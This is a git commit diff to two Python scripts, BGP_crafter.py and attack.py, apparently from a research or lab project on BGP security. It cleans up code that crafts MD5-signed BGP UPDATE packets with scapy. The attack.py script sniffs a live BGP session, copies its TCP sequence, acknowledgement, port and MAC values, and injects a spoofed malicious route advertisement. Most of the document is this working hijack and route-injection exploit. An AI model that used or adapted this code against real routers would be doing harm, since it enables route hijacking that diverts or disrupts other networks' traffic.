bb37320d27238d32b7dedcf7420f67e8f327054a
Vincent <vincent.vr@hotmail.com>
2020-03-29 14:08:51 +0200

    Initial code cleanup

--- BGP_crafter.py
+++ BGP_crafter.py
@@ -1,83 +1,71 @@
+import hashlib
+
+from TCP_MD5_parser import get_md5_salt_from_bytes
 from scapy.all import *
+from scapy.compat import raw
 from scapy.contrib.bgp import *
 from scapy.layers.inet import IP
-import hashlib
-from TCP_MD5_parser import get_md5_salt_from_bytes, check_password
-from scapy.utils import wrpcap
-from scapy.compat import raw
-import dpkt
 from scapy.layers.l2 import Ether
-#https://stackoverflow.com/questions/39104621/setting-up-bgp-layer-using-scapy/39107539#39107539 
 
 
 def sign_single_packet(packet, password):
-    #add an MD5 signature so that the length contains the signature
-    packet[TCP].options = [(19,b"\x00"*16)]
-    #get bytes
-    raw_ip_data = raw(packet[IP])
-    raw_tcp_data = raw(packet[TCP])
-    #get the salt from these bytes
+    # add an MD5 signature so that the length contains the signature
+    packet[TCP].options = [(19, b"\x00" * 16)]
+    # get bytes
+    raw_ip_data, raw_tcp_data = raw(packet[IP]), raw(packet[TCP])
+    # get the salt from these bytes
     salt = get_md5_salt_from_bytes(raw_ip_data, raw_tcp_data)
-    #computes the hash
-    if type(password)!="bytes":
+    # computes the hash
+    if type(password) is not bytes:
         password = password.encode("utf-8")
+
     salt += password
     packet_hash = hashlib.md5(salt).digest()
-    #add the signature in the options
-    packet[TCP].options = [(19,packet_hash)]
+    # add the signature in the options
+    packet[TCP].options = [(19, packet_hash)]
     return packet
 
 
-def craft_BGP_update_packet(nlri_prefix, path=[], local_pref=0, origin="IGP", next_hop=None, multi_exit_disc=0):
+def craft_BGP_update_packet(nlri_prefix, path=None, local_pref=0, origin="IGP", next_hop=None, multi_exit_disc=0):
     """Returns a scapy BGPupdate packet with the given parameters"""
+    if path is None:
+        path = []
+
     header = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
     attributes = []
-    # 2 bytes or 4 bytes AS numbers ?
+
     if origin == "IGP":
-        path_attribute = BGPPathAttr(type_flags=0b01000000, type_code=1, attribute=BGPPAOrigin(origin=0)) # attr_len=1
-        attributes.append(path_attribute)
+        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=1, attribute=BGPPAOrigin(origin=0)))
     if next_hop:
-        path_attribute = BGPPathAttr(type_flags=0b01000000, type_code=3, attribute=BGPPANextHop(next_hop=next_hop)) #attr_len=4
-        attributes.append(path_attribute)
+        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=3, attribute=BGPPANextHop(next_hop=next_hop)))
     if path:
-        path_segment = BGPPAASPath.ASPathSegment(segment_value=path, segment_length=len(path), segment_type="AS_SEQUENCE")
-        path_attribute = BGPPathAttr(type_flags=0b01000000, type_code=2, attribute=path_segment) # attr_len=4
-        attributes.append(path_attribute)
+        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=2, attribute=path_segment))
     if multi_exit_disc == 0:
-        path_attribute = BGPPathAttr(type_flags=0b10000000, type_code=4, attribute=BGPPAMultiExitDisc(med=multi_exit_disc))#  attr_len=4
-        attributes.append(path_attribute)
+        attributes.append(BGPPathAttr(type_flags=0b10000000, type_code=4, attribute=BGPPAMultiExitDisc(med=multi_exit_disc)))
     if local_pref != 0:
-        pref_attribute = BGPPathAttr(type_flags=0b01000000, type_code=5, attribute=BGPPALocalPref(local_pref=local_pref))
-        attributes.append(pref_attribute)
+        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=5, attribute=BGPPALocalPref(local_pref=local_pref)))
+
+    # Compose the UPDATE packet given all the specified options
     update = BGPUpdate(withdrawn_routes_len=0, path_attr=attributes, nlri=BGPNLRI_IPv4(prefix=nlri_prefix))
+
     bgp_packet = header / update
-    #bgp_packet.__class__(bytes(bgp_packet))
-    bgp_packet[BGPHeader].len = len(bgp_packet[BGPHeader]) # 20
-    #print('bgp header len', bgp_packet[BGPHeader].len)
-    # x = 0
-    # for i in bgp_packet[BGPUpdate].path_attr:
-    #    x += len(i)
-    # print(x)
-    # bgp_packet[BGPUpdate].path_attr_len = x
-    #print('bgp path attr len', bgp_packet[BGPUpdate].path_attr_len)
-    #print(bgp_packet)
-    #bgp_packet.show()
+    bgp_packet[BGPHeader].len = len(bgp_packet[BGPHeader])
     return bgp_packet
 
 
 def TCP_handshake(ip_src, ip_dst, sport, dport, seq_num):
-    """Perform a TCP handshake as a client, sending SYN, receiving SYN_ACK and responding with ACK"""
-    # SYN
-    ip=IP(src=ip_src,dst=ip_dst)
-    SYN=ip/TCP(sport=sport,dport=dport,flags='S',seq=seq_num)
-    #compute checksum
-    SYN = SYN.__class__(bytes(SYN))
+    """Perform a TCP handshake as a client, first 1) sending SYN 2) receiving SYN_ACK and 3) responding with ACK"""
+    ip = IP(src=ip_src, dst=ip_dst)
+    SYN = ip / TCP(sport=sport, dport=dport, flags='S', seq=seq_num)
+    SYN = SYN.__class__(bytes(SYN)) # compute checksum
     SYN.show()
-    #send SYN
-    SYNACK=sr1(ip/SYN)
+
+    # send SYN and read only the first answer
+    SYNACK = sr1(ip / SYN)
+
     # SYN-ACK
-    ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 1)
-    send(ip/ACK)
+    ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 1)
+    send(ip / ACK)
     return SYNACK
 
 
@@ -92,13 +80,11 @@ def inject_packet():
     print("Handshake done")
     ip = IP(src=IP_src, dst=IP_dst, proto=6, ttl=255)
     tcp = TCP(sport=src_port, dport=BGP_port, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA')
-    hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
-    bgp_packet = craft_BGP_update_packet("192.168.0.1/24", path=[2], local_pref=90 )
-    packet = Ether()/ ip / tcp / bgp_packet
+    bgp_packet = craft_BGP_update_packet("192.168.0.1/24", path=[2], local_pref=90)
+    packet = Ether() / ip / tcp / bgp_packet
     signed_packet = sign_single_packet(packet, "azerty")
     signed_packet.show()
     send(signed_packet)
 
 if __name__ == "__main__":
     inject_packet()
-
--- attack.py
+++ attack.py
@@ -69,73 +69,44 @@ BGP_password = ""
 #                 return True
 #     return False
 
-def inject_malicious_packet(seq_num, ack_num, dst_port, windo, src_port, mac_src, mac_dst):
+def inject_malicious_packet(seq_num, ack_num, dst_port, window, src_port, mac_src, mac_dst):
     """crafts and sends a BGPUpdate to the targeted AS spoofing the AS we want to spoof"""
     ip = IP(src=IP_TO_SPOOF, dst=IP_TARGET, ttl=1)
     tcp = TCP(sport=src_port, dport=dst_port, flags="PA")
-    tcp.seq = seq_num
-    tcp.ack = ack_num
-    tcp.window = windo
+    tcp.seq, tcp.ack, tcp.window = seq_num, ack_num, window
+
     print('numbers: ', tcp.seq, tcp.ack, tcp.window)
-    # hdr = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
+
     bgp_packet = craft_BGP_update_packet(NETWORK_TO_ADVERTISE, path=PATH, next_hop=NEXT_HOP, origin=ORIGIN,
                                          multi_exit_disc=MULTI_EXIT_DISC)
-    packet = Ether(src=mac_src, dst=mac_dst) / ip / tcp / bgp_packet
-    # packet.display()
-    signed_packet = sign_single_packet(packet, BGP_password)
+    malicious_packet = Ether(src=mac_src, dst=mac_dst) / ip / tcp / bgp_packet
+    signed_malicious_packet = sign_single_packet(malicious_packet, BGP_password)
+
     # recompute packet to compute checksums
-    signed_packet = signed_packet.__class__(bytes(signed_packet))
-    signed_packet.show()
+    signed_malicious_packet = signed_malicious_packet.__class__(bytes(signed_malicious_packet))
+    signed_malicious_packet.show()
     # wrpcap('update_example_crafted .pcap', signed_packet)
-    print("MALICOUS PACKET CRAFTED")
-    # send(signed_packet)
-    sendp(signed_packet)
-    # sr1(signed_packet)
+
+    print("[*] Malicious packet crafted")
+    sendp(signed_malicious_packet)
     # print("Attack done, exiting")
     exit()
 
 
 def packet_callback(captured_packet):
     """Called when packets are captured, updates seq and ack numbers and calls the attack when a window is open"""
-    # malicious_bgp_packet = craft_BGP_update_packet("192.168.0.1/24", path=[], local_pref=0)
-    # malicious_bgp_packet.show()
-    # Then, set sequence number of the malicious packet to seq number of the captured packet:
-    #   malicious_bgp_packet[TCP] = captured_packet[TCP].seq (something like that)
     if captured_packet[TCP].sport == BGP_PORT or captured_packet[TCP].dport == BGP_PORT:
         # BGP packet or ACK
-        # if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
-        #     #Is that part really useful ?
-        #     #packet going to the targeted AS from the AS we want to spoof.
-        #     #take the seq and ack numbers from the packet
-        #     SEQUENCE_NUMBER = captured_packet[TCP].seq
-        #     ACK_NUMBER = captured_packet[TCP].ack
         if captured_packet[IP].dst == IP_TARGET and captured_packet[IP].src == IP_TO_SPOOF:
             # packet going to the AS we want to spoof from the targeted AS
-            # This packet is interesting if it is an ACK for a previously sent packet
-            # if captured_packet[TCP].flags == "A":
-            # if the targeted AS sends ACK
-
-            # SEQUENCE_NUMBER = captured_packet[TCP].ack
-            # ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
-
-            SEQUENCE_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
-            ACK_NUMBER = captured_packet[TCP].ack # + len(captured_packet[TCP].payload)
-
-            # ip_total_len = rp.getlayer(IP).len
-            # ip_header_len = rp.getlayer(IP).ihl * 32 / 8
-            # tcp_header_len = rp.getlayer(TCP).dataofs * 32 / 8
-            # tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
-
-            # ACK_NUMBER = captured_packet[TCP].seq + len(captured_packet[TCP].payload)
-            # now we have a window to send a malicious BGP packet
-            #source_port = captured_packet[TCP].sport
-            dst_port = captured_packet[TCP].dport
-            src_port = captured_packet[TCP].sport
-            window = captured_packet[TCP].window # - len(captured_packet[TCP].payload)
-            mac_src = captured_packet[Ether].src
-            mac_dst = captured_packet[Ether].dst
-            #print('Numbers: ', SEQUENCE_NUMBER, ACK_NUMBER, dst_port, window, src_port)
-            inject_malicious_packet(SEQUENCE_NUMBER, ACK_NUMBER, dst_port, window, src_port, mac_src, mac_dst)
+            # print('Numbers: ', SEQUENCE_NUMBER, ACK_NUMBER, dst_port, window, src_port)
+            inject_malicious_packet(captured_packet[TCP].seq + len(captured_packet[TCP].payload),
+                                    captured_packet[TCP].ack,
+                                    captured_packet[TCP].dport,
+                                    captured_packet[TCP].window,
+                                    captured_packet[TCP].sport,
+                                    captured_packet[Ether].src,
+                                    captured_packet[Ether].dst)
 
 
 def main(argv):
@@ -164,4 +135,3 @@ def main(argv):
 
 if __name__ == "__main__":
     main(sys.argv)
-
